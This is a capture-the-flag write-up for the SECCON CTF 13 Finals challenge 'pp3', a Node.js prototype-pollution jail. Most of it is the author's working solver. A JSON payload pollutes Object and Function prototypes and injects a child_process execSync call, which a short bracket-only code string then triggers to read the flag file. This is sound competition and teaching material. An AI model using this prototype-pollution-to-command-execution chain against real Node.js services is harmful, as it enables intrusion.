---
title: "Pp3 - SECCON CTF 13 Finals 2025"
category: "misc"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "nodejs", "misc", "seccon-ctf-13-finals"]
summary: "Did you solve pp4 in Quals?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/jail/pp3"
license: "none stated"
ctf:
  name: "SECCON CTF 13 Finals"
  year: 2025
  challenge: "Pp3"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/jail/pp3>
- **CTF:** SECCON CTF 13 Finals 2025

---

# [jail] pp3

## Description

Did you solve [pp4](https://github.com/arkark/my-ctf-challenges/tree/main/challenges/202411_SECCON_CTF_13_Quals/jail/pp4) in Quals? The limitation of **4** was too large.

```
nc pp3.{int,dom}.seccon.games 5000
```

## Attachments

- [pp3](distfiles)

## Usage

Launch a challenge server:

```sh
cd build
docker compose up
```

Run the author's solver:
```sh
docker run -it \
    -e SECCON_HOST=localhost \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/jail/pp3/solver/exploit.py>

```python
import pwn
import os
import json

pwn.context.log_level = "debug"


def connect() -> pwn.remote:
    return pwn.remote(
        os.getenv("SECCON_HOST", "localhost"), os.getenv("SECCON_PORT", "5000")
    )


command = "cat /flag-*.txt"

with connect() as io:
    io.sendlineafter(
        b"Input JSON: ",
        json.dumps(
            {
                "__proto__": {  # Object.prototype
                    "": "constructor",
                    "function Function() { [native code] }": "__proto__",
                    "function Array() { [native code] }": "toString",
                    "false": "get",
                    "true": "circular",
                    "get": "call",
                    "circular": {},
                },
                "toString": {
                    "__proto__": {  # Function.prototype
                        "": f"return global.process.mainModule.require('child_process').execSync('{command}').toString()",
                    },
                },
            }
        ).encode(),
    )
    io.sendlineafter(
        b"Input code: ",
        b"[[[][[][[]]][[][[][[][[]==[]==[]]][[][[]==[]]]=[][[][[]]][[][[]]]]][[][[][[][[]]]]]=[][[][[]]][[][[][[]==[]]]]][[][[]]][[]]]",  # len: 124
    )
    print(io.recvline().decode().strip())
```


## Solver: `memo.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202503_SECCON_CTF_13_Finals/jail/pp3/solver/memo.js>

```javascript
/*
Object.prototype.circular = {}
Object.prototype.circular.get = Function;
Function.prototype.toString = Function.prototype.call;
console.log(["console.log(123)"]);

// ref. https://github.com/nodejs/node/blob/v22.14.0/lib/internal/util/inspect.js#L1115-L1118
*/

Object.prototype[""] = "constructor";
// [][[]] === "constructor";
// [][[][[]]] === Array;
// [][[][[]]][[][[]]] === Function;

Object.prototype["function Function() { [native code] }"] = "__proto__";
// [][Function] === "__proto__";

Object.prototype["function Array() { [native code] }"] = "toString";
// [][[][[][[]]]] === "toString";

Object.prototype["false"] = "get";
// [][[]==[]] === "get";

Object.prototype["true"] = "circular";
// [][[]==[]==[]] === "circular";

Object.prototype["get"] = "call";
// [][[][[]==[]]] === "call";

Function.prototype[""] = "console.log(123)";
// [][[][[]]][[]] === "console.log(123)";

Object.prototype["circular"] = {};

// ---------------------------------------------------------------------

// // [].circular.get = Function;
// [][[][[]==[]==[]]][[][[]==[]]] = [][[][[]]][[][[]]];

// // Function.prototype.toString = Function.prototype.call;
// // Array.__proto__.toString = Array.call;
// // [][[][[]]][[][[][[][[]]]]][[][[][[][[]]]]] = [][[][[]]][[][[][[]==[]]]];
// [][[][[]]][[][/* [].circular.get = */Function]][[][[][[][[]]]]] = [][[][[]]][[][[][[]==[]]]];

// // console.log(["console.log(123)"]);
// console.log([[][[][[]]][[]]]);

// ---------------------------------------------------------------------s

console.log(
  [[[][[][[]]][[][[][[][[]==[]==[]]][[][[]==[]]]=[][[][[]]][[][[]]]]][[][[][[][[]]]]]=[][[][[]]][[][[][[]==[]]]]][[][[]]][[]]]
);
```
